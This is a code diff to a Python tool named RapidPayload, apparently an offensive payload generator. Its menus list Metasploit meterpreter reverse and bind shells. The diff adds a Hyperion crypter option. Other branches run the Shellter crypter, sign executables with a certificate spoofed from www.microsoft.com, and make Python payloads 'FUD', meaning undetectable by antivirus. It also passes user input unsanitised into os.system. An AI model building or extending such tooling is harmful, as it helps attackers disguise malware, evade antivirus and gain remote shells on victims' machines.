@@ -349,13 +349,14 @@ def RapidP():
     
     select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2} Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2} Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2} Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2} Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2} MacOS\n{0}{2}[{1}{2}{2}6{0}]{1} {2} Java\n{0}{2}[{1}{2}{2}7{0}]{1} {2} Apple_ios\n{0}{2}[{1}{2}{2}8{0}]{1} {2} Connect_Ngrok\n{0}{2}[{1}{2}{2}9{0}]{1} {2} Connect_LocalHost\n{0}{2}[{1}{2}{2}10{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2} Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
     if select == '1':        
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2}Crypter_Shellter\n{0}[{1}{2}8{0}]{1} {2}Signs_EXE\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2}Crypter_Shellter\n{0}[{1}{2}8{0}]{1} {2}Signs_EXE\n{0}[{1}{2}9{0}]{1} {2}Crypter_Hyperion\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
         if type == '0':
             banner()
             RapidP()
         elif type == '7':
             print("\n{0}{1}RapidPayload:~/{2}".format(cyan, bold, end))
             dirtt=os.getcwd()
+            print("\033[1m\033[36m")            
             os.system("wine "+dirtt+"/Image/shellter.exe")
             print("\n{0}{1}RapidPayload:~/{2}".format(cyan, bold, end))
         elif type == '8':
@@ -364,11 +365,28 @@ def RapidP():
             wi1=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
             wi2=input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))
             dirtt=os.getcwd()
+            print("\033[1m\033[36m")            
             os.system("python3 "+dirtt+"/Image/.signs.py www.microsoft.com 443 "+wi1+" "+wi2+".exe")
             os.system("rm -rf certs")
             print("\033[1m\033[36m")
             os.system("ls")
-            os.system("chmod +x "+wi2+".exe")            	                                                                             
+            os.system("chmod +x "+wi2+".exe")
+        elif type == '9':
+            print("\033[1m\033[36m")
+            os.system("ls")				
+            wi11=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
+            wi22=input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))            
+            dirtt=os.getcwd()
+            os.system("cp -r "+dirtt+"/Image/Hyperion/Fasm "+dirtt+"/")
+            os.system("cp -r "+dirtt+"/Image/Hyperion/Src "+dirtt+"/")
+            os.system("cp "+dirtt+"/Image/Hyperion/hyperion.exe "+dirtt+"/")
+            print("\033[1m\033[36m")            
+            os.system("wine hyperion.exe "+wi11+" "+wi22+".exe")
+            print("\033[1m\033[36m")            
+            os.system("ls")            
+            os.system("rm -rf Fasm")
+            os.system("rm -rf Src")            
+            os.system("rm -rf hyperion.exe")                                                                                    	                                                                             
         else:             
             main('Windows', type)
     if select == '2':       
@@ -402,6 +420,7 @@ def RapidP():
             print("")
             namepyfud=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
             dirtt=os.getcwd()
+            print("\033[1m\033[36m")            
             os.system("chmod +x "+dirtt+"/Image/.py_fud.py")
             os.system("python "+dirtt+"/Image/.py_fud.py "+namepyfud)
             print("\n{0}{1}RapidPayload:~/Save#FUD_python_RapidPayload.py {2}".format(cyan, bold, end))
@@ -412,6 +431,7 @@ def RapidP():
             namepyfud1=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
             namepyfud2=input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))            
             dirtt=os.getcwd()
+            print("\033[1m\033[36m")            
             os.system("chmod +x "+dirtt+"/Image/.nx.py")
             os.system("python "+dirtt+"/Image/.nx.py --file="+namepyfud1+" --out="+namepyfud2+".py")
             print("\033[1m\033[36m")
